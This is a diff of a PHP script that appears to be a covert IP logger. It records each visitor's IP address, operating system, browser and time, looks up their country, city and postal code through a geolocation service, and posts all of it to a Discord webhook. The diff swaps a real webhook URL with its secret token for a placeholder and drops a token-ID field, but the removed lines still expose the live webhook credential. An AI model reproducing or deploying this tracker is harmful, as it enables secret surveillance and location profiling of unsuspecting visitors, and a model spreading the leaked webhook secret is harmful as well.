@@ -1,9 +1,5 @@
 <?php
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
-$token_id       =   $_GET["token"];
-print_r($_GET);
-if($_GET["token"] === "") $token_id = "No ID";
-if($_GET["token"] === null) $token_id = "No ID";
 function getOS() { 
     global $user_agent;
     $os_platform    =   "Dropout Is Daddy";
@@ -81,7 +77,7 @@ else{
 	}
 date_default_timezone_set('Australia/Sydney');
 $time = date('Y-m-d H:i:s');
-$url = "https://discordapp.com/api/webhooks/739054439540981790/IT9HuhXlZUZUdlD47D8BZWoH-T0DhWhfxUq4ux_ImNI-yzfg1TKHwNWbm6a9ytXDK1hE";
+$url = "Webhook URL";
 
 $ipdat = @json_decode(file_get_contents( 
     "http://www.geoplugin.net/json.gp?ip=" . $ip)); 
@@ -99,7 +95,7 @@ $hookObject = json_encode([
 
             "type" => "rich",
 
-            "description" => "**Token ID: `$token_id`\nIP: `$ip`\nDevice: `$user_os`\nBrowser: `$user_browser`\nTime: `$time`\nCountry: `$ipdat->geoplugin_countryName`\nCity: `$ipdat->geoplugin_city`\nContinent: `$ipdat->geoplugin_continentName`\nTimezone: `$ipdat->geoplugin_timezone`\nPostal Code: `$ipshet->zip`**",
+            "description" => "**IP: `$ip`\nDevice: `$user_os`\nBrowser: `$user_browser`\nTime: `$time`\nCountry: `$ipdat->geoplugin_countryName`\nCity: `$ipdat->geoplugin_city`\nContinent: `$ipdat->geoplugin_continentName`\nTimezone: `$ipdat->geoplugin_timezone`\nPostal Code: `$ipshet->zip`**",
 
             "url" => "https://dropout.vip/",
 
